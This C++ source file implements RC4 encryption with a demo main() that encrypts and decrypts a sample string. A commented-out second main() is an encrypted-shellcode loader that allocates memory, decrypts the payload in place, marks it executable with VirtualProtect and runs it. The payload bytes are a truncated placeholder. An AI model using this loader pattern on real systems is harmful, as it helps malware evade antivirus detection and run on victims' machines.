#include <windows.h>
#include <iostream>
#include <vector>
#include <string.h>

// Encrypted shellcode (RC4-encrypted)
// This should be generated using the rc4_encrypt_decrypt function offline
unsigned char encrypted_shellcode[] = {
    0x91, 0x2F, 0xB6, 0x88, 0xC3, 0xDD, 0x34, 0xA2
    // Truncated for example
};

unsigned char rc4_key[] = "SecretKey123"; // Simple RC4 key

// RC4 key scheduling and PRGA
void rc4_encrypt_decrypt(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    // KSA - Key Scheduling Algorithm
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        std::swap(S[i], S[j]);
    }

    // PRGA - Pseudo Random Generation Algorithm
    int i = 0;
    j = 0;
    for (size_t k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        unsigned char rnd = S[(S[i] + S[j]) % 256];
        data[k] ^= rnd;
    }
}

int main() {
    unsigned char data[] = "Hello Beginner! hihi nopro everyone.";
    unsigned char key[] = "SuperSecretKey123";

    std::cout << "before encrypt: " << data << std::endl;

    rc4_encrypt_decrypt(data, strlen((char*)data), key, strlen((char*)key));

    std::cout << "after encrypt rc4 (hex): ";
    for (int i = 0; i < strlen((char*)data); i++) printf("%02X ", data[i]);

    rc4_encrypt_decrypt(data, strlen((char*)data), key, strlen((char*)key));

    std::cout << "\nafter decrypt rc4: " << data << std::endl;
}


//int main() {
//    SIZE_T size = sizeof(encrypted_shellcode);
//
//    // Allocate memory for shellcode
//    LPVOID exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//    if (!exec_mem) {
//        std::cerr << "Failed to allocate memory\n";
//        return -1;
//    }
//
//    // Copy encrypted shellcode into allocated memory
//    memcpy(exec_mem, encrypted_shellcode, size);
//
//    // Decrypt shellcode in memory
//    rc4_encrypt_decrypt((unsigned char*)exec_mem, size, rc4_key, strlen((char*)rc4_key));
//
//    // Change memory protection to executable
//    DWORD oldProtect;
//    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldProtect);
//
//    // Call the shellcode
//    ((void(*)())exec_mem)();
//
//    return 0;
//}

